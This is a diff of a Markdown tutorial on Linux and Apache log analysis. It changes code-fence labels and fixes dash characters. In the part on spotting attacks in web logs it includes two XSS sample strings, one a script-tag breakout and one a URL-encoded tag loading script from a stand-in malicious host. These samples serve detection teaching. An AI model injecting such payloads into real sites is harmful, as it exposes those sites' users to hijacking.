@@ -108,11 +108,11 @@ A typical log directory in Linux-based systems contains many types of logs. Firs
 
 As an example below are couple of lines from different logs. The first is an example of auth log line and the second is an example of a system log line. They are similar in format. First the time stamp, hostname, who reported and what.
 
-```log
+```rest
 Jan 18 19:24:59 examplehost sudo: pam_unix(sudo:auth): authentication failure; logname= uid=1073634 euid=0 tty=/dev/pts/0 ruser=username rhost=  user=username
 ```
 
-```log
+```rest
 Jan 23 18:05:24 examplehost dnsmasq[1536]: using nameserver 8.8.8.8#53
 ```
 
@@ -121,8 +121,8 @@ Jan 23 18:05:24 examplehost dnsmasq[1536]: using nameserver 8.8.8.8#53
 
 Apache creates two logs under the `/var/log/apache2/` (may vary depending on the system) and it contains an error log and an access log. The error log contains diagnostic information and any records of errors encountered. The access log contains everything else. It is highly customizable but can contain something like the following.
 
-```log
-127.0.0.1 ­- frank [10/Oct/2007:13:55:36 ­0700] "GET /index.html HTTP/1.0" 200 2326
+```rest
+127.0.0.1 -- frank [10/Oct/2007:13:55:36 -0700] "GET /index.html HTTP/1.0" 200 2326
 ```
 
 The first in the line is the host, followed by the identity reported by the client (here dash as it is not found) and the userid (usually the `REMOTE_USER` environment variables contents). After this there is the timestamp and the request line used followed by the return code and transferred object size.
@@ -176,13 +176,13 @@ So you have the logs for the web server and you are wondering what you should be
 
 For example, in the request line one could see something like the following that could result in XSS attack.
 
-```log
+```rest
 ’\"--></style></script><script>MALICIOUS CODE</script>
 ```
 
 Or you could be seeing strings with many urlencoded characters when you are not supposed to see them. For example the following might be something you do not want to see.
 
-```log
+```rest
 %3cscript%20src=%22http%3a%2f%2fwww.malicious.com%2fcode.js%22%3e%3c%2fscript%3e
 ```
 
